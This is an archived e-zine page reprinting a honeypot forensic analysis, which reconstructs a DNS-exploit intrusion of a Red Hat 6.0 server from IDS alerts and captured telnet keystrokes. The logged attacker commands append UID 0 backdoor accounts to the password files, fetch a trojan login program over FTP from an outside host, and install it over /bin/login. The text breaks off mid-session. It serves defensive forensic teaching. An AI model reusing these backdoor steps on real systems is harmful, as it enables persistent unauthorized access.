<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<!-- saved from url=(0043)http://www.collusion.org/Article.cfm?ID=237 -->
<HTML><HEAD><TITLE>Collusion E-zine - Know Your Enemy: A Forensic Analysis</TITLE>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<META content="The electronics enthusiast group of Austin, Texas." 
name=Description><!--
	Collusion Group, Collu5ion Group, C0llu5i0n Gr0up, Quake, 3dgl, 3dfx, opengl, red boxes, phone phreaking, blue boxing, red boxing, gambling hacking, cable tv hacking, surveillance equipment, blue box, red box
	-->
<META 
content="Collusion Group, Collu5ion Group, C0llu5i0n Gr0up, Quake, 3dgl, 3dfx, opengl, hackers, hacking, phreaks, phreaker, phreaking, freaking, red boxing, blue boxing, phrack, phracker, phracking, fracking, hacking, red box, lock picking, cracking, spying, espionage, bugs, counter measures, hacking, cable tv hacking, cable tv test chips, red box, blue box, computer hacking, cable tv converter boxes" 
name=keywords><!--
	Collusion Group, Collu5ion Group, C0llu5i0n Gr0up, phone phreaking, red boxes, cable tv hacking, red boxing, gambling hacking, smart card hacking, surveillance equipment, red box
	-->
<META content=ALL name=ROBOTS>
<META content="Collusion E-zine" name=DC.Title>
<META 
content="Collusion Group, Collu5ion Group, C0llu5i0n Gr0up, Quake, 3dgl, 3dfx, opengl, computer hacking, phone phreaking, red boxing, smart card hacking, gambling hacking" 
name=DC.Subject>
<META content="The electronics enthusiast group of Austin, Texas." 
name=DC.Description>
<SCRIPT language=JavaScript>
<!--
function MM_jumpMenu(targ,selObj,restore){ //v3.0
  eval(targ+".location='"+selObj.options[selObj.selectedIndex].value+"'");
  if (restore) selObj.selectedIndex=0;
}
//-->
</SCRIPT>
<!-- counter -->
<STYLE type=text.css>
.lnav, .lnav a { text-decoration: none }
.lnav a:hover { text-decoration: underline overline }
</STYLE>
<!-- Retrieving Issue Parms --><!-- Header -->
<META content="MSHTML 6.00.2900.2523" name=GENERATOR></HEAD>
<BODY text=red vLink=red aLink=red link=red bgColor=black 
background="Collusion E-zine - Know Your Enemy A Forensic Analysis_files/collusion.htm"><A 
name=top>
<CENTER><!-- Banner Ad Engine --><!-- place ad --><A 
href="http://www.collusion.org/Banner.cfm?ID=20" target=_blank><IMG 
alt=CuervoCon 
src="Collusion E-zine - Know Your Enemy A Forensic Analysis_files/cuervo.gif" 
border=0></A> <!-- ad placed --><!-- Magazine Header -->
<TABLE cellSpacing=0 cellPadding=0 width=600 bgColor=black border=0>
  <TBODY>
  <TR>
    <TD bgColor=black colSpan=3>
      <CENTER><IMG height=100 
      src="Collusion E-zine - Know Your Enemy A Forensic Analysis_files/collusion2.jpg" 
      width=600 border=0> </CENTER></TD></TR><MAP name=navbar></MAP>
  <TR>
    <TD bgColor=#333333 colSpan=3 height=50><!-- THIS IS WHERE YOU ENTER TEXT FOR THE HEADER AREA  -->
      <CENTER><A href="http://www.collusion.org/Banner.cfm?ID=23" 
      target=_blank><FONT color=#ff7700>- check out the stylin' <B>NEW</B> 
      Collusion haxor gear at Jinx Hackwear!!! - </FONT></A><BR><A 
      href="http://www.collusion.org/Article.cfm?ID=244"><FONT color=#ff7700>- 
      sign up on the Collusion Syndicate's infotainment discussion lists!!! - 
      </FONT></A><BR></CENTER></TD></TR><!-- End of Head File --><!-- Link Bar -->
  <TR><!-- Link Bar -->
    <TD vAlign=top width=100 bgColor=#333333><!-- Left Section -->
      <TABLE cellSpacing=0 cellPadding=0 width=100 bgColor=#333333>
        <TBODY>
        <TR>
          <TD>
            <CENTER><BR><FONT face=Arial color=red size=3><STRONG>Volume 
            16<BR>Oct 2000</STRONG></FONT> <!--	<br> --></CENTER><SPAN 
            class=lnav><BR>
            <HR color=black>
            &nbsp;<A href="http://www.collusion.org/index.cfm"><FONT face=Arial 
            color=red size=2><STRONG>HOME</STRONG></FONT></A><BR><BR>&nbsp;<A 
            href="http://www.collusion.org/index.cfm?Section=5"><FONT face=Arial 
            color=red size=2><STRONG>TechKnow</STRONG></FONT></A><BR>&nbsp;<A 
            href="http://www.collusion.org/index.cfm?Section=4"><FONT face=Arial 
            color=red size=2><STRONG>Media Hack</STRONG></FONT></A><BR>&nbsp;<A 
            href="http://www.collusion.org/index.cfm?Section=1"><FONT face=Arial 
            color=red size=2><STRONG>Parallax</STRONG></FONT></A><BR>&nbsp;<A 
            href="http://www.collusion.org/index.cfm?Section=9"><FONT face=Arial 
            color=red size=2><STRONG>Reviews</STRONG></FONT></A><BR>&nbsp;<A 
            href="http://www.collusion.org/index.cfm?Section=8"><FONT face=Arial 
            color=red size=2><STRONG>Fiction</STRONG></FONT></A><BR>&nbsp;<A 
            href="http://www.collusion.org/index.cfm?Section=11"><FONT 
            face=Arial color=red 
            size=2><STRONG>Humor</STRONG></FONT></A><BR>&nbsp;<A 
            href="http://www.collusion.org/index.cfm?Section=7"><FONT face=Arial 
            color=red size=2><STRONG>Events</STRONG></FONT></A><BR>&nbsp;<A 
            href="http://www.collusion.org/index.cfm?Section=6"><FONT face=Arial 
            color=red size=2><STRONG>Offsite</STRONG></FONT></A><BR><BR>&nbsp;<A 
            href="http://www.collusion.org/linx.cfm?section=Mission"><FONT 
            face=Arial color=red 
            size=2><STRONG>Mission</STRONG></FONT></A><BR>&nbsp;<A 
            href="http://www.collusion.org/responses.cfm"><FONT face=Arial 
            color=#ff7700 
            size=2><STRONG>Responses</STRONG></FONT></A><BR>&nbsp;<A 
            href="http://www.collusion.org/linx.cfm?section=Lists"><FONT 
            face=Arial color=#ff7700 
            size=2><STRONG>Discussion</STRONG></FONT></A><BR>&nbsp;<A 
            href="http://chat.collusion.org/" target=_blank><FONT face=Arial 
            color=#ff7700 size=2><STRONG>#Collusion</STRONG></FONT></A><BR><!--	&nbsp;<a href="classifieds.cfm" style="text-decoration: none"><FONT FACE="Arial" COLOR="Red" size="2"><strong>Classifieds</strong></FONT></a></br>
-->&nbsp;<FONT face=Arial color=gold size=2><B>NEW!</B></FONT> <A 
            href="http://www.collusion.org/Banner.cfm?ID=23" target=_blank><FONT 
            face=Arial color=green size=2><STRONG>CG 
            Gear</STRONG></FONT></A><BR><BR>&nbsp;<A 
            href="http://www.collusion.org/linx.cfm?section=Write4Us"><FONT 
            face=Arial color=red size=2><STRONG>Submit a 
            Story</STRONG></FONT></A><BR>&nbsp;<A 
            href="http://www.collusion.org/linx.cfm?section=Collusioneers"><FONT 
            face=Arial color=red 
            size=2><STRONG>Collusioneers</STRONG></FONT></A><BR>&nbsp;<A 
            href="http://www.collusion.org/COPYRIGHT.TXT" target=_blank><FONT 
            face=Arial color=red size=2><STRONG>© &amp; <FONT size=-2>TM</FONT> 
            Info</STRONG></FONT></A><BR>&nbsp;<A 
            href="http://www.collusion.org/linx.cfm?section=Contact"><FONT 
            face=Arial color=red size=2><STRONG>Contact 
            Us</STRONG></FONT></A><BR>
            <HR color=black>
            <BR>
            <CENTER><A href="http://setiathome.ssl.berkeley.edu/" 
            target=_blank><IMG height=34 alt=SETI@Home 
            src="Collusion E-zine - Know Your Enemy A Forensic Analysis_files/setibut6.gif" 
            width=88 border=0></A><BR><BR><A 
            href="http://setiathome.ssl.berkeley.edu/stats/team/team_2567.html" 
            target=_blank>Join the<BR>Collusion<BR>SETI 
            Team!</A><BR><BR><BR><BR></CENTER></SPAN></TD></TR></TBODY></TABLE></TD><!-- Center Section -->
    <TD vAlign=top>
      <TABLE cellSpacing=5 cellPadding=2 width=490>
        <TBODY>
        <TR>
          <TD vAlign=center bgColor=black colSpan=2>
            <CENTER></CENTER></TD></TR>
        <TR>
          <TD vAlign=center bgColor=#333333 colSpan=2>
            <CENTER><FONT size=+2><STRONG>Know Your Enemy: A Forensic 
            Analysis</STRONG></FONT> </CENTER></TD></TR>
        <TR>
          <TD align=middle bgColor=#222222><STRONG>&nbsp;by Lance Spitzner 
            </STRONG></TD></TR>
        <TR>
          <TD align=left bgColor=#111111 colSpan=2><BR>
            <P><FONT face="Palatino,Book Antiqua"><FONT 
            size=-1><BR></FONT></FONT>
            <P><B>This paper is a continuation of the <A 
            href="http://www.enteract.com/~lspitz/enemy.html">Know Your 
            Enemy</A> series. The first three papers covered the tools and 
            tactics of the black-hat community.&nbsp; This paper, the fourth of 
            the series, studies step by step a successful attack of a 
            system.&nbsp;&nbsp;&nbsp; However, instead of focusing on the tools 
            and tactics used, we will focus on how we learned what happened and 
            pieced the information together.&nbsp; The purpose is to give you 
            the forensic skills necessary to analyze and learn on your own the 
            threats your organization faces. There is also an <A 
            href="http://www.msnbc.com/news/437641.asp">online, interactive 
            version</A> of this paper published by MSNBC.</B> 
            <P><B><FONT face="Palatino,Book Antiqua"><FONT 
            size=+2>Background</FONT></FONT></B> <BR>The information covered 
            here was obtained through the use of a <A 
            href="http://www.enteract.com/~lspitz/honeypot.html">honeypot</A>.&nbsp; 
            The honeypot was a default server installation of Red Hat 6.0.&nbsp; 
            No modifications were made to the default install, so the 
            vulnerabilities discussed here exist on any default RH 6.0 
            installation.&nbsp; Also, none of the data presented here has been 
            sanitized.&nbsp; All IP addresses, user accounts, and keystrokes 
            discussed here are real.&nbsp; This is done on purpose to both 
            validate the data and give a better understanding of forensic 
            analysis.&nbsp;&nbsp; Only the passwords have been modified to 
            protect the compromised systems. All sniffer information presented 
            here is in snort format.&nbsp; <A 
            href="http://www.snort.org/">Snort</A> is my sniffer and IDS system 
            of choice, due to its flexibility, capabilities, and price (its 
            free).&nbsp; All actions commited by the black-hat were captured 
            with snort. I use the IDS signatures supplied by Max Vision at <A 
            href="http://www.whitehats.com/">http://www.whitehats.com/</A>.&nbsp; 
            You can query his arachNIDs database for more information on all the 
            alerts discussed throughout this paper.&nbsp; You can find my snort 
            configuration and signature file (including the command line options 
            I use) <A href="http://www.enteract.com/~lspitz/snort.txt">here</A>. 
            Once you are done reading the paper, you can conduct your own 
            forensic analysis, as I have supplied all the <A 
            href="http://www.enteract.com/~lspitz/forensics.tar.gz">raw 
            data.</A>&nbsp; As you read this paper, take note of how many 
            different systems the black-hat uses.&nbsp; Also, throughout this 
            paper, the black-hat is identified as she, but we have no idea what 
            the true gender is. <BR>&nbsp; 
            <P><B><FONT face="Palatino,Book Antiqua"><FONT size=+2>The 
            Attack</FONT></FONT></B> <BR>On 26 April, at 06:43 snort alerted me 
            that one of my systems had be attacked with a 'noop' attack.&nbsp; 
            Packet payloads containing noops are an indication of a buffer 
            overflow attack.&nbsp; In this case, snort had detected the attack 
            and logged the alert to my /var/log/messages file (which is 
            monitored by <A 
            href="http://www.enteract.com/~lspitz/swatch.html">swatch</A>). 
            Note: throughout this paper, the IP address 172.16.1.107 is the IP 
            address of the honeypot. All other systems are the IP addresses used 
            by the black-hat. 
            <P><FONT face="Courier New,Courier"><FONT size=-1>Apr 26 06:43:05 
            lisa snort[6283]: <A 
            href="http://www.whitehats.com/IDS/181">IDS181/nops-x86</A>: 
            63.226.81.13:1351 -&gt; 172.16.1.107:53</FONT></FONT> 
            <P>My honeypots receive numerous probes, scans and queries on a <A 
            href="http://www.enteract.com/~lspitz/probed.txt">daily 
            basis</A>.&nbsp; However, an alert like this gets my immediate 
            attention, as it indicates a system may have been compromised.&nbsp; 
            Sure enough, less then two minutes later system logs indicate the 
            system is compromised, as our attacker initiates a connection and 
            logins to the box. 
            <P><FONT face="Courier New,Courier"><FONT size=-1>Apr 26 06:44:25 
            victim7 PAM_pwdb[12509]: (login) session opened for user twin by 
            (uid=0)</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>Apr 26 06:44:36 victim7 PAM_pwdb[12521]: (su) session opened 
            for user hantu by twin(uid=506)</FONT></FONT> 
            <P>Our intruder has gained super user access and now controls the 
            system.&nbsp; How was this accomplished, what happened?&nbsp; We 
            will now begin our forensic analysis and put the pieces together, 
            step by step. 
            <P><B><FONT face="Palatino,Book Antiqua"><FONT size=+2>The 
            Analysis</FONT></FONT></B> <BR>When studying an attack, the best 
            place to start is the beginning, where did the black-hat 
            start?&nbsp; Black-hats normally start with information gathering, 
            they need to determine what vulnerabilities exist before they can 
            strike.&nbsp; If your system has been compromised, this is normally 
            not the first time the black-hat has communicated with that 
            system.&nbsp; Most attacks involve some type of&nbsp; information 
            gathering before the attack is launched.&nbsp; So, this is where we 
            will start, the black-hat's information gathering stage. 
            <P>If we look at the alert above, the attack was on port 53.&nbsp; 
            This indicates a DNS attack was launched on our system.&nbsp; So I 
            will begin by looking through my <A 
            href="http://www.enteract.com/~lspitz/probed.txt">snort alerts</A> 
            and find possible information probes for DNS.&nbsp; We find a DNS 
            version query probe coming from the same system that attacked us. 
            <P><FONT face="Courier New,Courier"><FONT size=-1>Apr 25 02:08:07 
            lisa snort[5875]: <A 
            href="http://dev.whitehats.com/IDS/277">IDS277/DNS-version-query</A>: 
            63.226.81.13:4499 -&gt; 172.16.1.107:53</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>Apr 25 02:08:07 lisa 
            snort[5875]: <A 
            href="http://dev.whitehats.com/IDS/277">IDS277/DNS-version-query</A>: 
            63.226.81.13:4630 -&gt; 172.16.1.101:53</FONT></FONT> 
            <P>Notice the date of the probe, April 25.&nbsp; Our system was 
            attacked April 26, from the same system.&nbsp; Our system was 
            compromised the day after the probe.&nbsp; I am guessing that an 
            automated tool was used by our black-hat to scan numerous systems 
            for a known <A 
            href="http://www.cert.org/advisories/CA-2000-03.html">DNS 
            vulnerability.</A>&nbsp; After the scan was ran, the black-hat 
            reviewed the results, identified vulnerable systems (including ours) 
            and then launched her exploit.&nbsp; We have now pieced together the 
            first part of our story.&nbsp; Our black-hat scanned us on 25 April, 
            then exploited the system the following day.&nbsp; Based on our IDS 
            alerts, it appears we were hit by a <A 
            href="http://www.enteract.com/~lspitz/enemy.html">script kiddie</A> 
            with a well known DNS vulnerability.&nbsp; But how was the attack 
            launched, and how does it work?&nbsp; Lets find out. 
            <P><B><FONT face="Palatino,Book Antiqua"><FONT size=+2>The 
            Exploit</FONT></FONT></B> <BR>Like most commercial IDS systems, 
            snort has the capability of showing us the packet load data of all 
            IP packets.&nbsp; We will use this capability to conduct an analysis 
            of the exploit.&nbsp; The exploit information was obtained from the 
            snort logs (stored in tcpdump binary format).&nbsp; I queried the 
            snort log and began reviewing the packets starting when the attack 
            was launched.&nbsp; I did not limit my information query to the host 
            63.236.81.13, as the attacker may have used other systems.&nbsp; 
            This is in fact the case, as our black-hat used at least three 
            different systems to run the exploit. The goal of the exploit is to 
            gain a root shell on the remote system.&nbsp; Once the black-hat 
            gains a root shell, they can run any command as root.&nbsp; Normally 
            an account is placed in the /etc/passwd and /etc/shadow file.&nbsp; 
            You can find both the exploit and remote commands executed in the <A 
            href="http://www.enteract.com/~lspitz/exploit.html">detailed 
            forensic analysis</A>.&nbsp; Once the exploit was ran and a root 
            shell obtained, the following commands were ran as root. 
            <P><FONT face="Courier New,Courier"><FONT size=-1>cd /; uname -a; 
            pwd; id;</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>Linux apollo.uicmba.edu 2.2.5-15 #1 Mon Apr 19 22:21:09 EDT 
            1999 i586 unknown</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>/</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>uid=0(root) gid=0(root) 
            groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)</FONT></FONT> 
            <BR><FONT face="Courier New,Courier"><FONT size=-1>echo 
            "twin::506:506::/home/twin:/bin/bash" &gt;&gt; 
            /etc/passwd</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>echo "twin:w3nT2H0b6AjM2:::::::" &gt;&gt; 
            /etc/shadow</FONT></FONT> 
            <P><FONT face="Courier New,Courier"><FONT size=-1>echo 
            "hantu::0:0::/:/bin/bash" &gt;&gt; /etc/passwd</FONT></FONT> 
            <BR><FONT face="Courier New,Courier"><FONT size=-1>echo 
            "hantu:w3nT2H0b6AjM2:::::::" &gt;&gt; /etc/shadow</FONT></FONT> 
            <P>Our black-hat runs several commands as root.&nbsp; First, she 
            confirms the system she is on (<B><FONT 
            face="Courier New,Courier"><FONT size=-1>uname 
            -a</FONT></FONT></B>), the directory (<B><FONT 
            face="Courier New,Courier"><FONT size=-1>pwd</FONT></FONT></B>) and 
            then confirms her uid (<B><FONT face="Courier New,Courier"><FONT 
            size=-1>id</FONT></FONT></B>).&nbsp; She then adds two user accounts 
            to the system, <I>twin</I> and <I>hantu</I>, both with the same 
            password.&nbsp; Note that <I>twin</I> has the UID of 506 and 
            <I>hantu</I> has the UID of 0 (on a side note, <I>hantu</I> means 
            ghost in Indonesian).&nbsp; Remeber, most systems do not let UID 0 
            telnet to the box. So she had to create an account that would give 
            her remote access, then another account that would give her UID 0. 
            So, our black-hat ran an exploit on DNS, gained a root shell, then 
            inserted two accounts.&nbsp; Within 90 seconds of the exploit she 
            telnets into the box and gains root access (see timestamps of logs 
            below). So, what does she do next? 
            <P><FONT face="Courier New,Courier"><FONT size=-1>Apr 26 06:43:05 
            lisa snort[6283]: <A 
            href="http://www.whitehats.com/IDS/181">IDS181/nops-x86</A>: 
            63.226.81.13:1351 -&gt; 172.16.1.107:53</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>Apr 26 06:44:25 victim7 
            PAM_pwdb[12509]: (login) session opened for user twin by 
            (uid=0)</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>Apr 26 06:44:36 victim7 PAM_pwdb[12521]: (su) session opened 
            for user hantu by twin(uid=506)</FONT></FONT> 
            <P><B><FONT face="Palatino,Book Antiqua"><FONT size=+2>Gaining 
            Access</FONT></FONT></B> <BR>Fortunately for us, telnet is a 
            plaintext protocol, the data is not encrypted.&nbsp; This means we 
            can decode the sniffer traces and capture all the her 
            keystrokes.&nbsp; Snort has already done this for us, another reason 
            I prefer snort.&nbsp; By analyzing the keystrokes snort captured of 
            the telnet sessions, we can determine what our black-hat does.&nbsp; 
            What I like best about decoding telnet sessions as we capture not 
            only STDIN (the keystrokes) but STDOUT and STDER.&nbsp; Lets review 
            the telnet sessions and identify the black-hats activities (comments 
            in <B>RED</B>). 
            <P><FONT face="Courer New,Courier"><FONT size=-1>First, our friend 
            telnets to the box (from 213.28.22.189) as <I>twin</I> and then 
            gains superuser access as <I>hantu</I>. Remeber, she cannot just 
            telnet in as <I>hantu</I> as UID 0 is restricted for remote 
            access.</FONT></FONT> 
            <P><FONT face="Courier New,Courier"><FONT size=-1>&nbsp;#' !"'!"# ' 
            9600,9600'VT5444VT5444</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>Red Hat Linux release 6.0 
            (Shedwig)</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>Kernel 2.2.5-15 on an i586</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>login: twin</FONT></FONT> 
            <BR><FONT face="Courier New,Courier"><FONT size=-1>Password: 
            Password: hax0r</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>No directory 
            /home/twin!</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>Logging in with home = "/".</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>[twin@apollo /]$ su 
            hantu</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>Password: Password: hax0r</FONT></FONT> 
            <P><FONT face="Courier New,Courier"><FONT size=-1>Next, our friend 
            ftps to another system to get her toolkit.</FONT></FONT> 
            <P><FONT face="Courier New,Courier"><FONT size=-1>[root@apollo /]# 
            ftp 24.112.167.35</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>Connected to 
            24.112.167.35.</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>220 linux FTP server 
            (Version wu-2.5.0(1) Tue Sep 21 16:48:12 EDT 1999) 
            ready.</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>Name (24.112.167.35:twin): welek</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>331 Password required for 
            welek.</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>Password:password</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>230 User welek logged 
            in.</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>Remote system type is UNIX.</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>Using binary mode to 
            transfer files.</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>ftp&gt; get 
            bj.c</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>local: bj.c remote: bj.c</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>200 PORT command 
            successful.</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>150 Opening BINARY mode data connection for bj.c (1010 
            bytes).</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>226 Transfer complete.</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>1010 bytes received in 
            0.115 secs (8.6 Kbytes/sec)</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>ftp&gt; quit</FONT></FONT> 
            <BR><FONT face="Courier New,Courier"><FONT size=-1>221-You have 
            transferred 1010 bytes in 1 files.</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>221-Total traffic for this 
            session was 1421 bytes in 1 transfers.</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>221-Thank you for using the 
            FTP service on linux.</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>221 Goodbye.</FONT></FONT> 
            <P><FONT face="Courier New,Courier"><FONT size=-1>Third, she grabs 
            her backdoor, compiles <A 
            href="http://www.enteract.com/~lspitz/bj.txt">bj.c,</A> and installs 
            it as a replacement for /sbin/login. Notice all the commands 
            executed at the command prompt for the compile. It appears that all 
            the compile commands were executed 'cut and paste' style. 
            </FONT></FONT>
            <P><FONT face="Courier New,Courier"><FONT size=-1>[root@apollo /]# 
            gcc -o login bj.cchown root:bin loginchmod 4555 loginchmod u-w 
            logincp /bin/login /usr/bin/xstatcp /bin/login 
            /usr/bin/old&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
            rm /bin/loginchmod 555 /usr/bin/xstatchgrp bin /usr/bin/xstatmv 
            login /bin/loginrm bj.cgcc -o login bj.c</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>bj.c:16: unterminated 
            string or character constant</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>bj.c:12: possible real 
            start of unterminated constant</FONT></FONT> 
            <P><FONT face="Courier New,Courier"><FONT size=-1>She now attempts 
            to implement the compiled backdoor</FONT></FONT> 
            <P><FONT face="Courier New,Courier"><FONT size=-1>[root@apollo /]# 
            chown root:bin login</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>chown: login: No such file 
            or directory</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>[root@apollo /]# chmod 4555 
            login</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>chmod: login: No such file or directory</FONT></FONT> 
            <BR><FONT face="Courier New,Courier"><FONT size=-1>[root@apollo /]# 
            chmod u-w login</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>chmod: login: No such file 
            or directory</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>[root@apollo /]# cp 
            /bin/login /usr/bin/xstat</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>[root@apollo /]# cp 
            /bin/login /usr/bin/old</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>[root@apollo /]# rm 
            /bin/login</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>[root@apollo /]# chmod 555 /usr/bin/xstat</FONT></FONT> 
            <BR><FONT face="Courier New,Courier"><FONT size=-1>[root@apollo /]# 
            chgrp bin /usr/bin/xstat</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>[root@apollo /]# mv login 
            /bin/login</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>mv: login: No such file or directory</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>[root@apollo /]# rm 
            bj.c</FONT></FONT> 
            <P><FONT face="Courier New,Courier"><FONT size=-1>Dooh!&nbsp; She 
            just can't get it right, lets try again. She ftp's to the site 
            re-downloads the backdoor.</FONT></FONT> 
            <P><FONT face="Courier New,Courier"><FONT size=-1>[root@apollo /]# 
            ftp 24.112.167.35</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>Connected to 
            24.112.167.35.</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>220 linux FTP server 
            (Version wu-2.5.0(1) Tue Sep 21 16:48:12 EDT 1999) 
            ready.</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>Name (24.112.167.35:twin): [root@apollo /]#&nbsp;&nbsp; ftp 
            24.112.167.35</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>Connected to 
            24.112.167.35.</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>220 linux FTP server 
            (Version wu-2.5.0(1) Tue Sep 21 16:48:12 EDT 1999) 
            ready.</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>Name (24.112.167.35:twin): welek</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>331 Password required for 
            welek.</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>Password:331 Password required for welek.</FONT></FONT> 
            <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>Password:password</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>230 User welek logged 
            in.</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>Remote system type is UNIX.</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>Using binary mode to 
            transfer files.</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>ftp&gt; get 
            bj.c</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>qulocal: bj.c remote: bj.c</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>200 PORT command 
            successful.</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>u150 Opening BINARY mode data connection for bj.c (1011 
            bytes).</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>226 Transfer complete.</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>1011 bytes received in 
            0.134 secs (7.3 Kbytes/sec)</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>ftp&gt; itit</FONT></FONT> 
            <BR><FONT face="Courier New,Courier"><FONT size=-1>221-You have 
            transferred 1011 bytes in 1 files.</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>221-Total traffic for this 
            session was 1422 bytes in 1 transfers.</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>221-Thank you for using the 
            FTP service on linux.</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>221 Goodbye.</FONT></FONT> 
            <P><FONT face="Courier New,Courier"><FONT size=-1>This is now her 
            second attempt at compiling the backdoor. Notice the exact same "cut 
            and paste" commands are used. </FONT></FONT>
            <P><FONT face="Courier New,Courier"><FONT size=-1>[root@apollo /]# 
            gcc -o login bj.cchown root:bin loginchmod 4555 loginchmod u-w 
            logincp /bin/login /usr/bin/xstatcp /bin/login 
            /usr/bin/old&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
            rm /bin/loginchmod 555 /usr/bin/xstatchgrp bin /usr/bin/xstatmv 
            login /bin/loginrm bj.cgcc -o login bj.c</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>bj.c: In function 
            `owned':</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>bj.c:16: warning: assignment makes pointer from integer 
            without a cast</FONT></FONT> 
            <P><FONT face="Courier New,Courier"><FONT size=-1>Now we see the 
            compiled backdoor implemented. The valid copy of /bin/login is moved 
            to /usr/bin/xstat, while the compiled trojan <A 
            href="http://www.enteract.com/~lspitz/bj.txt">bj.c</A> is used to 
            replace /bin/login. This is the backdoor. This trojan allows anyone 
            with the TERM setting of vt9111 unauthorized access</FONT></FONT> 
            <P><FONT face="Courier New,Courier"><FONT size=-1>[root@apollo /]# 
            chown root:bin login</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>[root@apollo /]# chmod 4555 
            login</FONT></FONT> <BR><FONT face="Courier New,Courier"><FONT 
            size=-1>[root@apollo /]# chmod u-w login</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>[root@apollo /]# cp 
            /bin/login /usr/bin/xstat</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>cp: /bin/login: No such 
            file or directory</FONT></FONT> <BR><FONT 
            face="Courier New,Courier"><FONT size=-1>[root@apollo /]# cp 
